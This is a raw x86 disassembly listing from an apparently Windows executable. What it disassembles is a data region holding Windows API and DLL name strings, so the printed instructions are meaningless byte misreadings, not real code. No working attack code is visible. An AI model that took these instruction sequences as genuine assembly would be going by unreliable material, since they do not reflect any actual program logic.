  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
